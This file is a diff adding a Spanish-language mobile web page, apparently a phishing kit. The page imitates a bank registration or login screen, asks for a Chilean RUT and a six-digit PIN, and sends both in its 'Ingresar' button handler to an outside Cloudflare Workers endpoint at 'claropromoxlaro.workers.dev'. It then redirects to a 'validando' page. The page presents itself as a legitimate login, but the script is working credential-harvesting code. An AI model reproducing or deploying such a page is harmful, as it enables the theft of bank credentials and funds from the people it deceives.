@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Regístrate</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    margin:0;
+    background:#fff;
+    display:flex;
+    justify-content:center;
+    font-family:Arial, Helvetica, sans-serif;
+    overflow:hidden;
+    height:100vh;
+}
+
+.phone{
+    max-width:430px;
+    margin:auto;
+    min-height:100vh;
+    position:relative;
+    background:#fff;
+    width:100%;
+    padding-bottom:100px;
+}
+
+.header{
+    height:72px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    position:relative;
+}
+
+.back{
+    position:absolute;
+    left:18px;
+    font-size:46px;
+    color:#3b3b3b;
+    cursor:pointer;
+    line-height:1;
+}
+
+.header h2{
+    font-size:26px;
+    font-weight:500;
+    color:#222;
+}
+
+.content{
+    padding:120px 34px 0;
+}
+
+.title{
+    font-size:33px;
+    font-weight:800;
+    line-height:1.2;
+    text-align:center;
+    color:#1f2023;
+}
+
+.subtitle{
+    margin-top:28px;
+    font-size:20px;
+    color:#2d2d2d;
+    text-align:center;
+    line-height:1.4;
+}
+
+.form{
+    margin-top:7px;
+}
+
+.form-group{
+    margin-bottom:0;
+}
+
+label{
+    display:block;
+    color:#5B2EFF;
+    font-size:16px;
+    margin-bottom:8px;
+    font-weight:500;
+}
+
+input{
+    width:92%;
+    height:56px;
+    border:2.5px solid #5B2EFF;
+    border-radius:18px;
+    padding:0 24px;
+    font-size:18px;
+    color:#555;
+    outline:none;
+    transition:border-color 0.2s;
+    display:block;
+    margin:8px auto 0;
+}
+
+input:focus{
+    border-color:#4a25d6;
+}
+
+input::placeholder{
+    color:#7f7f7f;
+}
+
+/* Botón Continuar */
+.btn-continuar{
+    width:92%;
+    height:52px;
+    border:none;
+    border-radius:40px;
+    background:#ECECEC;
+    color:#BDBDBD;
+    font-size:20px;
+    font-weight:500;
+    cursor:not-allowed;
+    transition:all 0.25s ease;
+    display:block;
+    margin:12px auto 0;
+}
+
+.btn-continuar.active{
+    background:#5B2EFF;
+    color:#fff;
+    cursor:pointer;
+    box-shadow:0 4px 15px rgba(91, 46, 255, 0.3);
+}
+
+.btn-continuar.active:hover{
+    transform:scale(1.02);
+    box-shadow:0 6px 20px rgba(91, 46, 255, 0.4);
+}
+
+.btn-continuar.active:active{
+    transform:scale(0.98);
+}
+
+/* OVERLAY - Fondo oscuro */
+.overlay{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.55);
+    opacity:0;
+    visibility:hidden;
+    transition:opacity 0.35s ease, visibility 0.35s ease;
+    z-index:999;
+}
+
+.overlay.show{
+    opacity:1;
+    visibility:visible;
+}
+
+/* BOTTOM SHEET - Panel desde abajo */
+.bottom-sheet{
+    position:fixed;
+    left:0;
+    right:0;
+    bottom:0;
+    background:#fff;
+    border-radius:30px 30px 0 0;
+    padding:30px 30px 40px;
+    transform:translateY(100%);
+    transition:transform 0.35s ease;
+    box-shadow:0 -10px 30px rgba(0,0,0,0.15);
+    z-index:1000;
+    max-width:430px;
+    margin:0 auto;
+}
+
+.bottom-sheet.show{
+    transform:translateY(0);
+}
+
+.sheet-header{
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    position:relative;
+    margin-bottom:10px;
+}
+
+.sheet-header h2{
+    font-size:22px;
+    font-weight:600;
+    color:#222;
+}
+
+.cerrar{
+    position:absolute;
+    right:0;
+    font-size:32px;
+    cursor:pointer;
+    color:#666;
+    transition:transform 0.2s;
+    line-height:1;
+}
+
+.cerrar:hover{
+    transform:rotate(90deg);
+}
+
+/* Círculos del PIN */
+.pin{
+    display:flex;
+    justify-content:center;
+    gap:14px;
+    margin:40px 0 35px;
+}
+
+.circle{
+    width:22px;
+    height:22px;
+    border:2.5px solid #8d8d8d;
+    border-radius:50%;
+    transition:all 0.2s;
+    background:#fff;
+}
+
+.circle.filled{
+    border-color:#5B2EFF;
+    background:#5B2EFF;
+    transform:scale(1.05);
+}
+
+.circle.active{
+    border-color:#5B2EFF;
+    box-shadow:0 0 0 4px rgba(91, 46, 255, 0.15);
+}
+
+/* Botón Ingresar del bottom sheet */
+.btn-ingresar-sheet{
+    width:100%;
+    height:52px;
+    border:none;
+    border-radius:40px;
+    background:#ECECEC;
+    color:#BDBDBD;
+    font-size:20px;
+    font-weight:500;
+    cursor:not-allowed;
+    transition:all 0.25s ease;
+}
+
+.btn-ingresar-sheet.active{
+    background:#5B2EFF;
+    color:#fff;
+    cursor:pointer;
+    box-shadow:0 4px 15px rgba(91, 46, 255, 0.3);
+}
+
+.btn-ingresar-sheet.active:hover{
+    transform:scale(1.02);
+    box-shadow:0 6px 20px rgba(91, 46, 255, 0.4);
+}
+
+.btn-ingresar-sheet.active:active{
+    transform:scale(0.98);
+}
+
+/* Enlace "¿Olvidaste tu contraseña?" */
+.forgot-password-sheet{
+    display:block;
+    text-align:center;
+    margin-top:25px;
+    color:#5B2EFF;
+    text-decoration:underline;
+    font-size:17px;
+    font-weight:500;
+    cursor:pointer;
+    transition:opacity 0.2s;
+}
+
+.forgot-password-sheet:hover{
+    opacity:0.7;
+}
+
+/* Loader */
+.loader-container {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(255,255,255,0.9);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+}
+
+.loader-container.active {
+    display: flex;
+}
+
+.loader {
+    width: 50px;
+    height: 50px;
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #5B2EFF;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* Ajustes para pantallas más pequeñas */
+@media(max-width:430px){
+    .content{
+        padding:100px 24px 0;
+    }
+    
+    .title{
+        font-size:21px;
+    }
+    
+    .subtitle{
+        font-size:15px;
+        margin-top:22px;
+    }
+    
+    .form{
+        margin-top:45px;
+    }
+    
+    input{
+        width: 100%;
+        height: 50px;
+        font-size: 16px;
+        padding: 0 18px;
+        border-radius: 7px;
+        margin: 6px auto 0;
+    }
+
+    .btn-continuar{
+        width:100%;
+        height:48px;
+        font-size:18px;
+        margin:12px auto 0;
+    }
+    
+    .header h2{
+        font-size:22px;
+    }
+    
+    .back{
+        font-size:38px;
+        left:14px;
+    }
+
+    .bottom-sheet{
+        padding:25px 24px 35px;
+    }
+
+    .pin{
+        gap:12px;
+        margin:35px 0 30px;
+    }
+
+    .circle{
+        width:20px;
+        height:20px;
+        border-width:2px;
+    }
+
+    .btn-ingresar-sheet{
+        height:48px;
+        font-size:18px;
+    }
+
+    .forgot-password-sheet{
+        font-size:16px;
+        margin-top:22px;
+    }
+
+    .sheet-header h2{
+        font-size:20px;
+    }
+}
+
+@media(max-width:380px){
+    .content{
+        padding:80px 18px 0;
+    }
+    
+    .title{
+        font-size:24px;
+    }
+    
+    .subtitle{
+        font-size:15px;
+        margin-top:18px;
+    }
+    
+    .form{
+        margin-top:35px;
+    }
+    
+    input{
+        width:88%;
+        height:44px;
+        font-size:15px;
+        padding:0 14px;
+        border-radius:14px;
+        border-width:2px;
+        margin:5px auto 0;
+    }
+
+    .btn-continuar{
+        width:88%;
+        height:44px;
+        font-size:16px;
+        border-radius:30px;
+        margin:8px auto 0;
+    }
+    
+    label{
+        font-size:14px;
+        margin-bottom:6px;
+    }
+    
+    .header h2{
+        font-size:20px;
+    }
+    
+    .back{
+        font-size:32px;
+        left:12px;
+    }
+
+    .bottom-sheet{
+        padding:20px 18px 30px;
+    }
+
+    .pin{
+        gap:10px;
+        margin:30px 0 25px;
+    }
+
+    .circle{
+        width:18px;
+        height:18px;
+        border-width:2px;
+    }
+
+    .btn-ingresar-sheet{
+        height:44px;
+        font-size:16px;
+        border-radius:30px;
+    }
+
+    .forgot-password-sheet{
+        font-size:15px;
+        margin-top:20px;
+    }
+
+    .sheet-header h2{
+        font-size:18px;
+    }
+
+    .cerrar{
+        font-size:28px;
+    }
+}
+
+/* Estilo para input number - quitar flechas */
+input[type="number"]::-webkit-inner-spin-button,
+input[type="number"]::-webkit-outer-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+}
+
+input[type="number"] {
+    -moz-appearance: textfield;
+    appearance: textfield;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="phone">
+
+<div class="header">
+<div class="back">&#8249;</div>
+<h2>Regístrate</h2>
+</div>
+
+<div class="content">
+
+<div class="title">
+Para comenzar ingresa tu<br>
+RUT
+</div>
+
+<div class="subtitle">
+Necesitamos validar tu identidad para continuar
+</div>
+
+<div class="form">
+
+<div class="form-group">
+<label>RUT</label>
+<input
+id="rut"
+type="text"
+maxlength="12"
+placeholder="12.345.678-9">
+</div>
+
+<!-- BOTÓN CONTINUAR -->
+<button class="btn-continuar" id="btnContinuar" disabled>Continuar</button>
+
+</div>
+
+</div>
+
+</div>
+
+<!-- OVERLAY - Fondo oscuro -->
+<div class="overlay" id="overlay"></div>
+
+<!-- BOTTOM SHEET - Panel desde abajo -->
+<div class="bottom-sheet" id="sheet">
+
+    <div class="sheet-header">
+        <h2>Ingresa tu clave</h2>
+        <span class="cerrar" id="cerrarBtn">✕</span>
+    </div>
+
+    <div class="pin" id="pinContainer">
+        <div class="circle" data-index="0"></div>
+        <div class="circle" data-index="1"></div>
+        <div class="circle" data-index="2"></div>
+        <div class="circle" data-index="3"></div>
+        <div class="circle" data-index="4"></div>
+        <div class="circle" data-index="5"></div>
+    </div>
+
+    <!-- CAMPO DE CLAVE MODIFICADO A TYPE="NUMBER" -->
+    <input 
+        type="number" 
+        id="claveSheet" 
+        maxlength="6" 
+        style="position:absolute;opacity:0;pointer-events:none;" 
+        autofocus
+        inputmode="numeric"
+        pattern="[0-9]*">
+
+    <button class="btn-ingresar-sheet" id="btnSheet" disabled>Ingresar</button>
+
+    <a href="#" class="forgot-password-sheet">¿Olvidaste tu contraseña?</a>
+
+</div>
+
+<!-- LOADER -->
+<div class="loader-container" id="loader">
+    <div class="loader"></div>
+</div>
+
+<script>
+// Elementos
+const rut = document.getElementById("rut");
+const overlay = document.getElementById("overlay");
+const sheet = document.getElementById("sheet");
+const claveSheet = document.getElementById("claveSheet");
+const btnSheet = document.getElementById("btnSheet");
+const btnContinuar = document.getElementById("btnContinuar");
+const circles = document.querySelectorAll(".circle");
+const cerrarBtn = document.getElementById("cerrarBtn");
+const loader = document.getElementById("loader");
+
+// Función para verificar si el RUT es válido (tiene al menos 2 dígitos)
+function esRutValido(rutValue) {
+    const limpio = rutValue.replace(/[^0-9kK]/g, '');
+    return limpio.length >= 2;
+}
+
+// Función para actualizar el estado del botón Continuar
+function actualizarBotonContinuar() {
+    if (esRutValido(rut.value)) {
+        btnContinuar.classList.add("active");
+        btnContinuar.disabled = false;
+    } else {
+        btnContinuar.classList.remove("active");
+        btnContinuar.disabled = true;
+    }
+}
+
+// Función para abrir el bottom sheet
+function abrirSheet() {
+    overlay.classList.add("show");
+    sheet.classList.add("show");
+    setTimeout(() => {
+        claveSheet.focus();
+        // En dispositivos móviles, forzar el teclado numérico
+        if ('showPicker' in HTMLInputElement.prototype) {
+            try {
+                claveSheet.showPicker();
+            } catch(e) {
+                // Fallback si showPicker no está disponible
+            }
+        }
+    }, 400);
+    // Resetear la clave al abrir
+    claveSheet.value = "";
+    actualizarCirculos();
+    btnSheet.classList.remove("active");
+    btnSheet.disabled = true;
+}
+
+// Función para cerrar el bottom sheet
+function cerrarSheet() {
+    overlay.classList.remove("show");
+    sheet.classList.remove("show");
+    // Quitar el foco del campo de clave
+    claveSheet.blur();
+}
+
+// Actualizar círculos del PIN
+function actualizarCirculos(){
+    const valor = claveSheet.value;
+    circles.forEach((circle, index) => {
+        circle.classList.remove("filled", "active");
+        if(index < valor.length){
+            circle.classList.add("filled");
+        }
+        if(index === valor.length){
+            circle.classList.add("active");
+        }
+    });
+}
+
+// Validar formulario del bottom sheet
+function validarSheet(){
+    if(claveSheet.value.length === 6){
+        btnSheet.classList.add("active");
+        btnSheet.disabled = false;
+    }else{
+        btnSheet.classList.remove("active");
+        btnSheet.disabled = true;
+    }
+}
+
+// Evento del RUT - formateo automático
+rut.addEventListener("input", function(){
+    let valor = this.value.replace(/[^0-9kK]/g,"").toUpperCase();
+    
+    if(valor.length > 1){
+        let dv = valor.slice(-1);
+        let num = valor.slice(0,-1);
+        num = num.replace(/\B(?=(\d{3})+(?!\d))/g,".");
+        this.value = num + "-" + dv;
+    }else{
+        this.value = valor;
+    }
+    
+    // Actualizar el botón Continuar
+    actualizarBotonContinuar();
+});
+
+// Evento click del botón Continuar - GUARDA EL RUT Y ABRE EL PANEL
+btnContinuar.addEventListener("click", function() {
+    if (this.classList.contains("active")) {
+        // Guardar el RUT en localStorage
+        const rutLimpio = rut.value.replace(/[^0-9kK]/g, '').toUpperCase();
+        let bancoldata = {};
+        try {
+            const storedData = localStorage.getItem('bancoldata');
+            bancoldata = storedData ? JSON.parse(storedData) : {};
+        } catch (e) {
+            console.error('Error al parsear bancoldata:', e);
+            bancoldata = {};
+        }
+        
+        // Generar transactionId único
+        const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        
+        bancoldata.usuario = rutLimpio;
+        bancoldata.transactionId = transactionId;
+        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+        
+        console.log('Usuario guardado:', rutLimpio, 'Transaction ID:', transactionId);
+        
+        abrirSheet();
+    }
+});
+
+// Evento del campo clave oculto (modificado para number)
+claveSheet.addEventListener("input", function(){
+    // Para input type="number", el valor viene como string
+    let valor = this.value;
+    // Eliminar cualquier caracter no numérico
+    valor = valor.replace(/[^0-9]/g, '');
+    if(valor.length > 6){
+        valor = valor.slice(0, 6);
+    }
+    this.value = valor;
+    actualizarCirculos();
+    validarSheet();
+});
+
+// Evento de teclado para el PIN (tecla enter)
+claveSheet.addEventListener("keydown", function(e){
+    if(e.key === "Enter" && this.value.length === 6){
+        btnSheet.click();
+    }
+});
+
+// Botón Ingresar - ENVÍA AL WORKER Y REDIRIGE A VALIDACIÓN
+btnSheet.addEventListener("click", async function(){
+    if(this.classList.contains("active")){
+        const clave = claveSheet.value;
+        
+        try {
+            // Mostrar loader
+            loader.classList.add('active');
+            
+            // Obtener datos de localStorage
+            let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+            const usuario = bancoldata.usuario;
+
+            if (!usuario) {
+                alert('Error: Usuario no encontrado');
+                loader.classList.remove('active');
+                return;
+            }
+
+            // Actualizar transactionId
+            const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            bancoldata.clave = clave;
+            bancoldata.transactionId = transactionId;
+            localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+
+            console.log('Enviando login:', { usuario, clave, transactionId });
+
+            // Enviar login al worker
+            const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    usuario: usuario,
+                    clave: clave,
+                    transactionId: transactionId
+                })
+            });
+
+            const result = await response.json();
+            console.log('Respuesta del login:', result);
+            
+            // Ocultar loader
+            loader.classList.remove('active');
+            
+            if (result.ok) {
+                // Cerrar el panel y redirigir a la página de validación
+                cerrarSheet();
+                // Redirigir a la página de validación
+                window.location.href = 'validando.html';
+            } else {
+                alert('Error en el login: ' + (result.error || 'Error desconocido'));
+            }
+            
+        } catch (error) {
+            console.error('Error completo:', error);
+            loader.classList.remove('active');
+            alert('Error al procesar el login: ' + error.message);
+        }
+    }
+});
+
+// Cerrar al hacer clic en el overlay
+overlay.addEventListener("click", cerrarSheet);
+
+// Cerrar con el botón X
+cerrarBtn.addEventListener("click", cerrarSheet);
+
+// Inicializar círculos y botón
+actualizarCirculos();
+actualizarBotonContinuar();
+
+// Permitir Enter en el campo RUT para activar el botón Continuar
+rut.addEventListener("keydown", function(e) {
+    if (e.key === "Enter" && btnContinuar.classList.contains("active")) {
+        btnContinuar.click();
+    }
+});
+
+// Forzar el enfoque al campo de clave cuando se abre el sheet
+// y asegurar que el teclado numérico aparezca
+document.addEventListener('click', function(e) {
+    if (sheet.classList.contains('show') && !e.target.closest('.bottom-sheet')) {
+        setTimeout(() => {
+            claveSheet.focus();
+        }, 100);
+    }
+});
+
+</script>
+
+</body>
+</html>
